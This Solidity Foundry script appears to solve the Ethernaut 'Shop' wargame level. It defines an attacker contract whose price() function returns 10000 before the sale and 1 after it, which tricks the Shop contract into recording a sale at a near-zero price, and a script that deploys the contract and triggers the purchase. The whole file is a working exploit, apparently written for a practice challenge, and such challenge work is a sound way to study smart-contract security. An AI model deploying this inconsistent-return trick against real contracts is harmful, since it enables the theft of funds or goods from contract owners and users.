pragma solidity ^0.8.0;

import {Script} from "forge-std/Script.sol";
import {console} from "forge-std/console.sol";
import {Buyer, Shop} from "../src/Buyer.sol";

// to be wrapped in the Buyer interface
contract Buyerrr
{
    Shop shop;

    constructor(address shopAddress)
    {
        shop = Shop(shopAddress);
    }

    function callBuy() external
    {
        shop.buy();
    }

    // follows the interface definition
    // but returns values inconsistently
    function price() public view returns(uint256)
    {
        if (!shop.isSold())
        {
            return 10000;
        }
        else
        {
            return 1;
        }
    }
}

contract buy is Script
{
    address shopAddress; // instance address

    function run() external
    {
        vm.startBroadcast();

        Buyerrr buyer = new Buyerrr(shopAddress);
        buyer.callBuy();

        vm.stopBroadcast();
    }
}
